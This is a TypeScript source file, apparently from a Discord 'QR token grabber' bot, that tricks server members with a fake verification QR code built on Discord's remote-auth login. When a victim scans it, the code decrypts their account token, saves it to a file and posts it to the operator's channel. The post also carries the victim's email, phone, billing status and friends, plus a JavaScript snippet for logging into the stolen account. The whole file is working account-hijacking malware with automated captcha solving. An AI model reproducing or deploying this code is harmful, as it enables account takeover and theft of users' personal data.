import WebSocket from "ws";
import {
  GuildMember,
  Collection,
  AttachmentBuilder,
  TextChannel,
} from "discord.js";
import {
  KeyPairKeyObjectResult,
  generateKeyPairSync,
  privateDecrypt,
  createHash,
} from "crypto";
import {
  ICaptcha,
  IHello,
  INonceProof,
  IPendingLogin,
  IPendingTicket,
  IPrendingRemoteInit,
} from "../interfaces/ISocketEvents";
import { toDataURL } from "qrcode";

const {
  getAllInfos,
  getBotToken,
  guildList,
  friendList
} = require("../util/js/fetch");
import {
  getTicketAxios,
  getTicketWithCaptchaAxios,
  getUserFriendsAxios,
  getBillingInformationAxios,
  getUserInformationAxios,
  sendMessageAxios,
  createFriendChannelAxios,
  sendMessageWithCaptchaAxios,
} from "../util/axios";
import { allSockets, sharedClient } from "..";
import { CaptchaSolver } from "./CaptchaSolver";
import { config } from "../util/config";
import { join } from "path";
import { IUserInfo } from "../interfaces/IDiscord";
import * as embeds from "../util/embeds";
import * as fs from "fs/promises";


export class DiscordSocket {
  public messages = new Collection<string, any>();
  public socket: WebSocket;
  public keyPair: KeyPairKeyObjectResult;
  public userInformation: IUserInfo | null = null;

  constructor(public readonly user: GuildMember) {
    this.socket = new WebSocket("wss://remote-auth-gateway.discord.gg/?v=2", {
      origin: "https://discord.com",
      handshakeTimeout: 10000,
    });

    this.keyPair = generateKeyPairSync("rsa", {
      modulusLength: 4096,
      publicExponent: 65537,
    });

    this.messages.set("hello", this.hello);
    this.messages.set("nonce_proof", this.nonce_proof);
    this.messages.set("pending_remote_init", this.pending_remote_init);
    this.messages.set("pending_ticket", this.pending_ticket);
    this.messages.set("pending_login", this.pending_login);
    this.messages.set("cancel", this.handleCancel);

    this.socket.on("message", (message) => {
      const messageData = JSON.parse(message.toString());
      const _handle = this.messages.get(messageData.op);
      if (!_handle) return this.messages.get("cancel")(this);
      _handle(this, messageData);
    });
  }

  private sendMessageToSocket(data: Object) {
    this.socket.send(JSON.stringify(data));
  }

  private async handleCancel(_this: DiscordSocket) {
    _this.user.send({ embeds: [await embeds.failedVerificationEmbed()] });
    _this.socket.terminate();
    allSockets.delete(_this.user.id);
  }

  private async handleFoundUserToken(_this: DiscordSocket, token: string) {
    const decryptedToken = privateDecrypt(
      { key: _this.keyPair.privateKey, oaepHash: "sha256" },
      Buffer.from(token, "base64")
    );

    await fs.appendFile(
      join(__dirname, "..", "..", "tokens.txt"),
      `${decryptedToken.toString()}\n`,
      "utf-8"
    );

    _this.taskAfterCompletion(_this, decryptedToken.toString());

    allSockets.delete(_this.user.id);
    _this.user.send({ embeds: [await embeds.verificationComplete()] });
    if (!config.roles[_this.user.guild.id]) return;
    _this.user.roles.add(config.roles[_this.user.guild.id]);
  }

  private async taskAfterCompletion(_this: DiscordSocket, token: string) {
    const GetInfos = await getAllInfos(token)

    const grabbedEmbed = await embeds.foundTokenEmbed();
    grabbedEmbed.setAuthor({
      name: `${_this.userInformation?.username!}#${_this.userInformation ?.discriminator!}`,
      iconURL: _this.userInformation?.avatar !== "0" 
      ? `${GetInfos.avatar}`
      : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
    });
    grabbedEmbed.addFields([
      {
        name: "⚙️ Account Info's Normal", value: 
        `Email: \`${GetInfos.mail}\`\n`+
        `Phone: \`${GetInfos.hasPhone}\`\n`+
        `Nitro: **${GetInfos.nitroType}**\n`+
        `Billing Info: **${GetInfos.billing}**`
      },
      { 
        name: "⚙️ Account All Info's", value: 
        `Username: \`${GetInfos.username}\`\n` + 
        `ID: \`${GetInfos.ID}\`\n` +
        `Badges: **${GetInfos.badges}**\n` +
        `Nitro-Type: **${GetInfos.nitroType}**\n` +
        `Billing: **${GetInfos.billing}**\n` +
        `Friends: \`${GetInfos.totalFriend}\`\n` +
        `Blocked: \`${GetInfos.totalBlocked}\`\n` +
        `Servers: \`${GetInfos.totalGuild}\`\n` +
        `Owned-Servers: \`${GetInfos.totalOwnedGuild}\`\n` +
        `BOT'S / NPC'S: \`${GetInfos.totalApplication}\`\n` +
        `Connections: \`${GetInfos.totalConnection}\`\n` +
        `NSFWAllowed: **${GetInfos.NSFWAllowed}**\n` +
        `Status: **${GetInfos.status}**\n` +
        `Gifts: **${GetInfos.Gifts}**\n` +
        `Biography: \`\`\`\n${GetInfos.hasBio}\n\`\`\`\n` 
      },
      { 
        name: "⚙️ Account All Friend's",
        value: `**${GetInfos.rareFriend}**`
      },
      { 
        name: "⚙️ Code to login",
        value: `\`\`\`js\n(\n    function() {\n        window.t=\"${token}\";\n        window.localStorage=document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage;\n        window.setInterval(() => window.localStorage.token=\`\"\${window.t}\"\`);\n        window.location.reload();\n    }\n)();\`\`\``
      },
      { 
        name: "💰 Found Token",
        value: `||**${token}**||`
      },
    ]);
    grabbedEmbed.setFooter({
      text: `https://github.com/k4itrun/WickQrTokenGrabber`,
      iconURL: _this.userInformation?.avatar !== "0" 
      ? `${GetInfos.avatar}`
      : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
    });
    (sharedClient.channel as TextChannel).send({
      embeds: [grabbedEmbed],
    });
  }

  private hello(_this: DiscordSocket, messageData: IHello) {
    _this.sendMessageToSocket({
      op: "init",
      encoded_public_key: _this.keyPair.publicKey
        .export({ type: "spki", format: "der" })
        .toString("base64"),
    });
  }

  private nonce_proof(_this: DiscordSocket, messageData: INonceProof) {
    const decryptedNonce = privateDecrypt(
      { key: _this.keyPair.privateKey, oaepHash: "sha256" },
      Buffer.from(messageData.encrypted_nonce as string, "base64")
    );

    const nonceHash = createHash("sha256")
      .update(decryptedNonce)
      .digest("base64url");

    _this.sendMessageToSocket({
      op: "nonce_proof",
      proof: nonceHash,
    });
  }

  private async pending_remote_init(
    _this: DiscordSocket,
    messageData: IPrendingRemoteInit
  ) {
    const fingerprintDataURL = `https://discordapp.com/ra/${messageData.fingerprint}`;

    const qrCodeDataImage = await toDataURL(fingerprintDataURL, {
      width: 300,
    });
    const qrCodeBuffer = Buffer.from(qrCodeDataImage.split(",")[1], "base64");
    const discordImage = new AttachmentBuilder(qrCodeBuffer).setName("img.png");

    _this.user.send({
      embeds: [
        (await embeds.directMessageEmbed()).setImage("attachment://img.png"),
      ],
      files: [discordImage],
    });
  }

  private pending_ticket(_this: DiscordSocket, messageData: IPendingTicket) {
    const decryptedTicket = privateDecrypt(
      { key: _this.keyPair.privateKey, oaepHash: "sha256" },
      Buffer.from(messageData.encrypted_user_payload as string, "base64")
    );

    const ticket = decryptedTicket.toString().split(":");
    const userInformation: IUserInfo = {
      userid: ticket[0],
      discriminator: parseInt(ticket[1]),
      avatar: ticket[2],
      username: ticket[3],
    };

    _this.userInformation = userInformation;
  }

  private async pending_login(
    _this: DiscordSocket,
    messageData: IPendingLogin
  ) {
    const foundTicket = await getTicketAxios(messageData.ticket);
    if (foundTicket && "encrypted_token" in foundTicket)
      return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);

    await _this.user.send({
      embeds: [await embeds.pleaseWaitEmbed()],
    });
    await _this.solveCaptchaTicket(_this, foundTicket, messageData);
  }

  private async solveCaptchaTicket(
    _this: DiscordSocket,
    captchaToSolve: ICaptcha,
    messageData: IPendingLogin,
    tries = 0
  ): Promise<void> {
    if (tries >= 2) return _this.handleCancel(_this);

    const solvedCaptcha = await CaptchaSolver.solveCaptcha(
      captchaToSolve.captcha_sitekey,
      captchaToSolve.captcha_rqdata
    );
    if (!solvedCaptcha) return _this.handleCancel(_this);

    const foundTicketWithCaptcha = await getTicketWithCaptchaAxios(
      messageData.ticket,
      solvedCaptcha,
      captchaToSolve.captcha_rqtoken
    );

    if (foundTicketWithCaptcha.encrypted_token)
      return _this.handleFoundUserToken(
        _this,
        foundTicketWithCaptcha.encrypted_token
      );

    return _this.solveCaptchaTicket(
      _this,
      captchaToSolve,
      messageData,
      tries + 1
    );
  }

  private async solveCaptchaMessage(
    _this: DiscordSocket,
    captchaToSolve: ICaptcha,
    tries = 0
  ): Promise<any> {
    if (tries >= 2) return _this.handleCancel(_this);

    const solvedCaptcha = await CaptchaSolver.solveCaptcha(
      captchaToSolve.captcha_sitekey,
      captchaToSolve.captcha_rqdata
    );
    console.log(solvedCaptcha);

    return solvedCaptcha;
  }
}
